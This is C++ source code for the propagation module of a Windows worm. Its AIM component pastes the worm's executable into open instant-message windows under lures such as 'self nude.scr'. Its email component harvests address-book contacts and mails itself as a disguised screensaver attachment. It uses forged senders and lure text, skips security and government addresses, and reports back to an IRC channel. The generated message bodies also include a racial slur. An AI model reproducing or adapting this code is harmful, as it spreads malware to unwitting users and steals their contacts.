#include <winsock2.h>
#include "spread.h"

ChildImage ChildImage;
Mutex ChildImageMutex;

SendLimit::SendLimit(){
	TimesToSend = 0;
	Event = NULL;
	Reset();
}

SendLimit::~SendLimit(){
	if(Event)
		CloseHandle(Event);
}

VOID SendLimit::Reset(VOID){
	TimesSent = 0;
	SetEvent(Event);
}

VOID SendLimit::SetTimesToSend(UINT TimesToSend){
	SendLimit::TimesToSend = TimesToSend;
	SetEvent(Event);
}

BOOL SendLimit::SendLimitExceeded(VOID){
	if(TimesToSend == 0 || TimesSent < TimesToSend)
		return FALSE;
	return TRUE;
}

VOID SendLimit::WaitForChange(VOID){
	if(Event)
		CloseHandle(Event);
	SECURITY_ATTRIBUTES SecAttr;
	SecAttr.nLength = sizeof(SecAttr);
	SecAttr.lpSecurityDescriptor = NULL;
	SecAttr.bInheritHandle = TRUE;
	Event = CreateEvent(&SecAttr, FALSE, FALSE, NULL);
	WaitForSingleObject(Event, INFINITE);
}

VOID SendLimit::Sent(VOID){
	TimesSent++;
}

BOOL CALLBACK AimSpread::EnumIMs(HWND hWnd, LPARAM lParam){
	CHAR Title[256];
	AimSpread* This = (AimSpread*)lParam;

	GetWindowText(hWnd, Title, sizeof(Title));

	if(strstr(Title, "Direct Instant Message")){
		PCHAR User = strtok(Title, ":");
		if(User){
			User[strlen(User) - 1] = NULL;
			CHAR RegistryName[256];
			strcpy(RegistryName, REG_IMS);
			strcat(RegistryName, "\\");

			DWORD Disposition;
			cRegistry Reg;
			Reg.CreateKey(HKEY_LOCAL_MACHINE, RegistryName);
			Reg.CloseKey();
			strcat(RegistryName, User);
			strcat(RegistryName, "\\");
			Reg.CreateKey(HKEY_LOCAL_MACHINE, RegistryName, &Disposition);
			Reg.CloseKey();
			if(Disposition == REG_CREATED_NEW_KEY){
				WINDOWPLACEMENT WindowPlacement;
				GetWindowPlacement(hWnd, &WindowPlacement);
				if(WindowPlacement.showCmd != SW_HIDE){
					//if(!OpenClipboard(NULL))
					//	return TRUE;

					ChildImageMutex.WaitForAccess();
					if(ChildImage.Expired())
						ChildImage.Create();

					//PCHAR OldTextPtr = NULL;
					CHAR OldText[256];
					BOOL OldTextExists;
					Clipboard Clipboard;
					OldTextExists = Clipboard.GetData(RegisterClipboardFormat("AOLMAIL"), (PBYTE)OldText, sizeof(OldText), TRUE);
					//OldText[0] = NULL;
					//HGLOBAL Handle = GetClipboardData(CF_TEXT);
					//if(Handle){
					//	OldTextPtr = (PCHAR)GlobalLock(Handle);
					//	strncpy(OldText, OldTextPtr, sizeof(OldText));
					//	GlobalUnlock(Handle);
					//}

					//if(ChildImage.Expired())
					//	ChildImage.Create();

					PBYTE Buffer = new BYTE[ChildImage.GetSize() + 200];
					//Handle = GlobalAlloc(GMEM_MOVEABLE, ChildImage.GetSize() + 200);
					ChildImageMutex.Release();
					//if(!Handle)
					//	return TRUE;
					//Buffer = (PBYTE)GlobalLock(Handle);
					PCHAR ExeNames[] = {"DSC1060193.scr", "my pic.scr", "self nude.scr"};
					PCHAR ExeName = ExeNames[rand_r(0, (sizeof(ExeNames) / sizeof(PCHAR)) - 1)];
					ChildImageMutex.WaitForAccess();
					sprintf((PCHAR)Buffer, "<HTML><FONT LANG=\"0\" SIZE=1>(right click -&gt;open ) <IMG SRC=\"%s\" ID=\"1\" WIDTH=\"30\" HEIGHT=\"31\" DATASIZE=\"%d\"></HTML><BINARY><DATA ID=\"1\" SIZE=\"%d\">", ExeName, ChildImage.GetSize(), ChildImage.GetSize());
					PCHAR End = strchr((PCHAR)Buffer, 0) + ChildImage.GetSize();
					memcpy(strchr((PCHAR)Buffer, 0), ChildImage.GetBuffer(), ChildImage.GetSize());
					ChildImageMutex.Release();
					strcpy(End, "</DATA></BINARY>");
					Clipboard.SetData(RegisterClipboardFormat("AOLMAIL"), Buffer, UINT(strchr(End, 0) - (PCHAR)Buffer));
					//GlobalUnlock(Handle);
					//EmptyClipboard();
					//SetClipboardData(RegisterClipboardFormat("AOLMAIL"), Handle);

					LCID Locale = 0x0409;
					//Handle = GlobalAlloc(GMEM_MOVEABLE, sizeof(LCID));
					//Locale = (LCID*)GlobalLock(Handle);
					//GlobalUnlock(Handle);
					//SetClipboardData(CF_LOCALE, Handle);
					Clipboard.SetData(CF_LOCALE, (PBYTE)&Locale, sizeof(LCID));

					//PCHAR Text2;
					//Handle = GlobalAlloc(GMEM_MOVEABLE, strlen(OldText) + 1);
					//Text2 = (PCHAR)GlobalLock(Handle);
					//strcpy(Text2, OldText);
					//GlobalUnlock(Handle);
					//SetClipboardData(CF_TEXT, Handle);
					Clipboard.Close();


					//CloseClipboard();
					EnumChildWindows(hWnd, EnumChildIMs, (LPARAM)lParam);
					Clipboard.Open(NULL);
					if(OldTextExists){
						Clipboard.SetData(RegisterClipboardFormat("AOLMAIL"), (PBYTE)OldText, strlen(OldText) + 1);
					}else{
						Clipboard.Empty();
					}
					Clipboard.Close();
					//ShowWindow(hWnd, SW_HIDE);
					//CHAR Text[64];
					//strcpy(Text, "Sent execute to ");
					//strncat(Text, User, 32);
					//IRCList.Notify(Text);
					Sleep(5000);
					This->Sent();
				}
			}
		}
	}
	return TRUE;
}

BOOL CALLBACK AimSpread::EnumChildIMs(HWND hWnd, LPARAM lParam){
	CHAR ClassName[MAX_PATH];
	GetClassName(hWnd, ClassName, sizeof(ClassName));
	if(strcmp(ClassName, "Ate32Class") == 0){
		SendMessage(hWnd, WM_COMMAND, 0x24F, 0);
		SendMessage(hWnd, WM_COMMAND, 0x10259, 0);

		/*AttachThreadInput(GetCurrentThreadId(), GetWindowThreadProcessId(hWnd, NULL), TRUE);
		
		SetForegroundWindow(hWnd);
		SetFocus(hWnd);

		keybd_event(VK_CONTROL, NULL, NULL, NULL);
		SendMessage(hWnd, WM_KEYDOWN, (WPARAM)VK_CONTROL, (LPARAM)0x002F0001);
		SendMessage(hWnd, WM_KEYDOWN, (WPARAM)0x56, (LPARAM)0x002F0001);
		//SendMessage(hWnd, WM_CHAR, (WPARAM)0x16, (LPARAM)0x002F0001);
		SendMessage(hWnd, WM_KEYUP, (WPARAM)0x56, (LPARAM)0xC02F0001);
		keybd_event(VK_CONTROL, NULL, KEYEVENTF_KEYUP, NULL);

		SendMessage(hWnd, WM_KEYUP, (WPARAM)VK_CONTROL, (LPARAM)0xC01D0001);
		SendMessage(hWnd, WM_KEYDOWN, (WPARAM)VK_RETURN, NULL);
		SendMessage(hWnd, WM_KEYUP, (WPARAM)VK_RETURN, NULL);

		AttachThreadInput(GetCurrentThreadId(), GetWindowThreadProcessId(hWnd, NULL), FALSE);*/
	}

	return TRUE;
}

AimSpread::AimSpread(){
	AimSpread(0);
}

AimSpread::AimSpread(UINT TimesToSend){
	SetTimesToSend(TimesToSend);
	Reset();
	StartThread();
}

VOID AimSpread::ThreadFunc(VOID){
	while(1){
		EnumWindows((WNDENUMPROC)EnumIMs, (LPARAM)this);
		Sleep(2000);
		if(SendLimitExceeded())
			WaitForChange();
	}
}

#ifndef NO_EMAIL_SPREAD

EmailSpread::EmailSpread(){
	EmailSpread(0);
}

EmailSpread::EmailSpread(UINT TimesToSend){
	BufferSize = 524288;
	Buffer = new BYTE[BufferSize];
	SetTimesToSend(TimesToSend);
	Reset();
	Start();
}

EmailSpread::~EmailSpread(){
	delete[] Buffer;
}

VOID EmailSpread::PreScan(VOID){
	cRegistry Reg;
	if(Reg.OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\WAB\\WAB4\\Wab File Name") == ERROR_SUCCESS){
		PCHAR String = Reg.GetString(NULL);
		if(String){
			Process(String);
		}
	}
}

VOID EmailSpread::Process(PCHAR FileName){
	PCHAR Extension = strrchr(FileName, '.');
	if(!Extension)
		Extension = FileName;
	else
		Extension++;
	DWORD FileSize;
	::File File;
	DWORD BytesRead;
	HANDLE Handle = File.Open(FileName, GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL);
	FileSize = GetFileSize(Handle, NULL);
	File.Read(Buffer, BufferSize, &BytesRead);
	if(BytesRead){
		if(stricmp(Extension, "wab") == 0){
			INT N = INT(*(Buffer + 0x64));
			DWORD Add = MAKELONG(MAKEWORD(*(Buffer + 0x60), *(Buffer + 0x61)), MAKEWORD(*(Buffer + 0x62), *(Buffer + 0x63)));
			CHAR EmailAddress[256];
			UINT j = 0;
			for(UINT i = 0; i < (N * 68); i += 68){
				for(UINT i2 = 0; i2 <= 68; i2++){
					EmailAddress[i2] = *(Buffer + Add + j + i);
					j += 2;
				}
				EmailAddress[68] = NULL;
				j = 0;
				Send(EmailAddress);
			}
		}else{
			for(UINT i = 0; i < BytesRead - 1; i++){
				if(Buffer[i] == '@'){
					CHAR Host[64];
					i++;
					for(UINT j = 0; j < 64 % (BytesRead - i); j++){
						Host[j] = Buffer[i + j];
						if(((Host[j] >= '0' && Host[j] <= '9') || (Host[j] >= 'A' && Host[j] <= 'Z') || (Host[j] >= 'a' && Host[j] <= 'z') || Host[j] == '-' || Host[j] == '.') && j < 63){
						}else
							break;
					}
					Host[j] = NULL;
					if(Host[strlen(Host) - 1] == '.')
						Host[strlen(Host) - 1] = NULL;
					if(strchr(Host, '.') && Host[0] != '.'){
						CHAR Name[64];
						i--;
						for(UINT j = 0; j < 64 % i; j++){
							UINT k = 63 - j;
							Name[k] = Buffer[i - j];
							if(((Name[k] >= '0' && Name[k] <= '9') || (Name[k] >= 'A' && Name[k] <= 'Z') || (Name[k] >= 'a' && Name[k] <= 'z') || Name[k] == '-' || Name[k] == '_' || (j == 0 && Name[k] == '@')) && j < 63){
							}else
								break;
						}
						if(j){
							Name[63] = NULL;
							PCHAR NameP = &Name[64 - j];
							if(strlen(NameP)){
								CHAR EmailAddress[132];
								strcpy(EmailAddress, NameP);
								strcat(EmailAddress, "@");
								strcat(EmailAddress, Host);
								PCHAR DontSend[] = {"bug", "gnu", "icrosof", "indow", "upda", "ource", "dmin", ".mil", ".gov", "buse", "inux", "uppor", "spam", "secur", "ccoun", "bmaste"};
								BOOL Match = FALSE;
								for(UINT m = 0; m < sizeof(DontSend) / sizeof(PCHAR); m++){
									if(strstr(EmailAddress, DontSend[m])){
										Match = TRUE;
										break;
									}
								}
								if(!Match){
									Send(EmailAddress);
								}
							}
						}
					}
				}
			}
		}
	}
	File.Close();
}

VOID EmailSpread::Send(PCHAR EmailAddress){
	if(SendLimitExceeded())
		WaitForChange();

	CHAR RegistryName[256];
	strcpy(RegistryName, REG_EMAILS);
	strcat(RegistryName, "\\");
	DWORD Disposition;
	cRegistry Reg;
	Reg.CreateKey(HKEY_LOCAL_MACHINE, RegistryName);
	Reg.CloseKey();
	strcat(RegistryName, EmailAddress);
	strcat(RegistryName, "\\");
	Reg.CreateKey(HKEY_LOCAL_MACHINE, RegistryName, &Disposition);
	Reg.CloseKey();
	if(Disposition == REG_CREATED_NEW_KEY){
		ChildImageMutex.WaitForAccess();
		if(ChildImage.Expired())
			ChildImage.Create();
		CHAR Text[256];
		Text[0] = NULL;
		PCHAR From = GenerateFromAddress();

		UINT Return = SendSMTP(EmailAddress, From, From, GenerateSubject(), GenerateBody(), (PCHAR)ChildImage.GetBuffer(), ChildImage.GetSize(), GenerateAttachmentName());
		ChildImageMutex.Release();
		if(Return == 2){
			strcpy(Text, "\x03""03Spam success ");
			Sent();
		}else
		if(Return == 1){
			strcpy(Text, "\x03""04Spam failure ");
		}
		if(Return > 0){
			strcat(Text, EmailAddress);
			//dprintf("%s\r\n", Text);
			IRCList.Notify(Text);
		}
	}
}

PCHAR EmailSpread::GenerateFromAddress(VOID){
	PCHAR FromNames[] = {"john", "earl", "volcom", "phil", "mike", "seth", "jim", "eric", "jeff", "randy", "jeremy", "misfits"};
	PCHAR FromHosts[] = {"yahoo.com", "hotmail.com", "aol.com", "gmail.com", "hush.com", "comcast.net"};
	CHAR Name[64];
	CHAR FromName[64];
	FromName[0] = NULL;
	if(!rand_r(0, 4)) strcat(FromName, "lil_"); else
	if(!rand_r(0, 3)) strcat(FromName, "emo_");
	if(!rand_r(0, 5)) strcat(FromName, "azn");
	strcat(FromName, FromNames[rand_r(0, (sizeof(FromNames) / sizeof(PCHAR)) - 1)]);
	switch(rand_r(0, 2)){
		CHAR Temp[64];
		BOOL Case;
		case 0:
			for(UINT i = 0; i < rand_r(1, 5); i++){
				switch(rand_r(0, 2)){
					case 0:
						Temp[i] = 'x';
					break;
					case 1:
						Temp[i] = 'X';
					break;
					case 2:
						Temp[i] = 'o';
					break;
				}
			}
			Temp[i] = NULL;
			strcpy(Name, Temp);
			strcat(Name, FromName);
			strcat(Name, Temp);
		break;
		case 1:
			Case = rand_r(0, 1);
			for(UINT i = 0; i < strlen(FromName) * 2; i += 2){
				Temp[i] = Case ? toupper(FromName[i / 2]) : tolower(FromName[i / 2]);
				Temp[i + 1] = Case ? tolower('x') : toupper('x');
			}
			Temp[i - 1] = NULL;
			strcpy(Name, Temp);
		break;
		default:
			strcpy(Name, FromName);
		break;
	}
	sprintf(FromAddress, "%s%d@%s", Name, rand_r(0, 1) ? rand_r(1, 999) : rand_r(1, 99999), FromHosts[rand_r(0, (sizeof(FromHosts) / sizeof(PCHAR)) - 1)]);
	return FromAddress;
}

PCHAR EmailSpread::GenerateAttachmentName(VOID){
	PCHAR AttachmentNames[] = {"attachment", "documents", "backup", "forwarded", "details"};
	PCHAR Ends[] = {".scp.scq.scr", ".scr", "-.SCR"};
	CHAR Temp[32];
	Temp[0] = NULL;
	if(!rand_r(0, 2))
		sprintf(Temp, "[%d-%d]", rand_r(100, 100000), rand_r(1, 500));
	CHAR Temp2[32];
	Temp2[0] = NULL;
	if(!rand_r(0, 2))
		sprintf(Temp2, "(%d)", rand_r(1, 9));
	sprintf(AttachmentName, "%s%s%s_[%d-%d-%d]%s", Temp2, AttachmentNames[rand_r(0, (sizeof(AttachmentNames) / sizeof(PCHAR)) - 1)], Temp, rand_r(1, 12), rand_r(1, 31), rand_r(2004, 2005), Ends[rand_r(0, (sizeof(Ends) / sizeof(PCHAR)) - 1)]);
	if(rand_r(0, 1)){
		if(Temp2[0])
			AttachmentName[3] = toupper(AttachmentName[3]);
		else
			AttachmentName[0] = toupper(AttachmentName[0]);
	}
	return AttachmentName;
}

PCHAR EmailSpread::GenerateSubject(VOID){
	PCHAR Subjects[] = {"hey", "k, here", "hey!", "FW:", "okay", "here", "hi", "hey there", "iight", "whats up", "lol", "heh", "sup"};
	strcpy(Subject, Subjects[rand_r(0, (sizeof(Subjects) / sizeof(PCHAR)) - 1)]);
	return Subject;
}

PCHAR EmailSpread::GenerateBody(VOID){
	PCHAR Word1[] = {"ass", "clown", "shit", "fag", "dick", "douche", "cake"};
	PCHAR Word2[] = {"hat", "boat", "wad", "head", "face", "wagon"};
	CHAR CoolWord[32];
	sprintf(CoolWord, "%s%s", Word1[rand_r(0, (sizeof(Word1) / sizeof(PCHAR)) - 1)], Word2[rand_r(0, (sizeof(Word2) / sizeof(PCHAR)) - 1)]);
	PCHAR Body1[] = {"k", "ok", "here", "hey", "okay"};
	PCHAR Body2[] = {"the file", "that thing", "that shit", "that nigger", "the shit"};
	PCHAR Body3[] = {"i promised", "you like", "you wanted", "i found", "i almost deleted"};
	PCHAR Comma = ",";
	PCHAR Exclaimation = "!";
	PCHAR Null = "";
	sprintf(Body, "%s %s%s %s %s%s", Body1[rand_r(0, (sizeof(Body1) / sizeof(PCHAR)) - 1)], CoolWord, rand_r(0, 1) ? Comma : Null, Body2[rand_r(0, (sizeof(Body2) / sizeof(PCHAR)) - 1)], Body3[rand_r(0, (sizeof(Body3) / sizeof(PCHAR)) - 1)], rand_r(0, 2) ? Exclaimation : Null);
	for(UINT i = 0; i < strlen(Body) - 1; i++){
		if(rand_r(0, 10) == 0 && Body[i] != ' ' && Body[i + 1] != ' '){
			CHAR Temp = Body[i];
			Body[i] = Body[i + 1];
			Body[i + 1] = Temp;
			i++;
		}
	}
	return Body;
}

#endif